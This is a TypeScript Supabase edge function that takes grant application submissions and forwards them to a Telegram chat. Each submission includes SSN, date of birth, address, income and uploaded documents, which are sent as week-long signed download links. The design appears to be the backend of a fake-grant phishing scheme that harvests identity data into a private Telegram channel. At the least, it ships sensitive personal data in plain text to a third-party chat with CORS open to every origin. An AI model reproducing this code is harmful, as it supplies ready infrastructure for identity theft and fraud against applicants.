import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.49.1";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

interface UploadedFile {
  name: string;
  type: string;
  size: string;
  category: string;
  path?: string; // Storage path for generating signed URL
}

interface ApplicationData {
  applicationNumber: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dateOfBirth: string;
  ssn?: string;
  streetAddress: string;
  city: string;
  state: string;
  zipCode: string;
  employmentStatus: string;
  employerName?: string;
  jobTitle?: string;
  annualIncome: string;
  grantType: string;
  requestedAmount: string;
  purposeOfGrant: string;
  organizationName?: string;
  organizationType?: string;
  uploadedFiles?: UploadedFile[];
  submittedAt: string;
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");
    const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
    const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Missing Telegram configuration");
      return new Response(
        JSON.stringify({ error: "Telegram not configured" }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const data: ApplicationData = await req.json();
    console.log("Received application:", data.applicationNumber);

    // Helper to escape user-provided content for Telegram HTML parse mode
    const escapeHtml = (text: string): string => {
      if (!text) return "";
      return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
    };

    // Generate signed URLs for uploaded files if we have storage access
    let fileLinks: { category: string; name: string; url: string }[] = [];
    if (
      data.uploadedFiles &&
      data.uploadedFiles.length > 0 &&
      SUPABASE_URL &&
      SUPABASE_SERVICE_ROLE_KEY
    ) {
      const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

      for (const file of data.uploadedFiles) {
        if (file.path) {
          const { data: signedUrlData, error } = await supabase.storage
            .from("grant-documents")
            .createSignedUrl(file.path, 60 * 60 * 24 * 7); // 7 days

          if (!error && signedUrlData?.signedUrl) {
            fileLinks.push({
              category: file.category,
              name: file.name,
              url: signedUrlData.signedUrl,
            });
          } else {
            console.error(`Failed to create signed URL for ${file.path}:`, error);
          }
        }
      }
    }

    // Format uploaded files section (HTML-safe with clickable links)
    let filesSection = "";
    if (fileLinks.length > 0) {
      filesSection = `
📎 <b>UPLOADED DOCUMENTS</b>
${fileLinks
  .map(
    (file) =>
      `• ${escapeHtml(file.category)}: <a href="${file.url}">${escapeHtml(file.name)}</a>`
  )
  .join("\n")}
`;
    } else if (data.uploadedFiles && data.uploadedFiles.length > 0) {
      // Fallback: just show file names if signed URLs failed
      filesSection = `
📎 <b>UPLOADED DOCUMENTS</b>
${data.uploadedFiles
  .map(
    (file) =>
      `• ${escapeHtml(file.category)}: ${escapeHtml(file.name)} (${escapeHtml(file.size)})`
  )
  .join("\n")}
`;
    } else {
      filesSection = `
📎 <b>UPLOADED DOCUMENTS</b>
• No documents uploaded
`;
    }

    // Format the message for Telegram using HTML (more reliable than Markdown)
    const message = `
🏛️ <b>NEW GRANT APPLICATION</b>
━━━━━━━━━━━━━━━━━━━━

📋 <b>Application #:</b> <code>${escapeHtml(data.applicationNumber)}</code>
📅 <b>Submitted:</b> ${escapeHtml(data.submittedAt)}

👤 <b>APPLICANT INFO</b>
• Name: ${escapeHtml(data.firstName)} ${escapeHtml(data.lastName)}
• Email: ${escapeHtml(data.email)}
• Phone: ${escapeHtml(data.phone)}
• DOB: ${escapeHtml(data.dateOfBirth)}
${data.ssn ? `• SSN: ${escapeHtml(data.ssn)}` : ""}

🏠 <b>ADDRESS</b>
${escapeHtml(data.streetAddress)}
${escapeHtml(data.city)}, ${escapeHtml(data.state)} ${escapeHtml(data.zipCode)}

💼 <b>EMPLOYMENT</b>
• Status: ${escapeHtml(data.employmentStatus)}
• Employer: ${escapeHtml(data.employerName || "N/A")}
• Job Title: ${escapeHtml(data.jobTitle || "N/A")}
• Annual Income: ${escapeHtml(data.annualIncome)}

💰 <b>GRANT DETAILS</b>
• Type: ${escapeHtml(data.grantType)}
• Requested Amount: ${escapeHtml(data.requestedAmount)}
• Organization: ${escapeHtml(data.organizationName || "N/A")}
• Org Type: ${escapeHtml(data.organizationType || "N/A")}

📝 <b>PURPOSE</b>
${escapeHtml(data.purposeOfGrant)}
${filesSection}
━━━━━━━━━━━━━━━━━━━━
✅ Application received successfully
    `.trim();

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: false,
      }),
    });

    const telegramResult = await telegramResponse.json();
    console.log("Telegram response:", telegramResult);

    if (!telegramResult.ok) {
      console.error("Telegram API error:", telegramResult);
      return new Response(
        JSON.stringify({
          error: "Failed to send to Telegram",
          details: telegramResult,
        }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    return new Response(
      JSON.stringify({
        success: true,
        applicationNumber: data.applicationNumber,
      }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(
      JSON.stringify({ error: "Internal server error", details: String(error) }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});
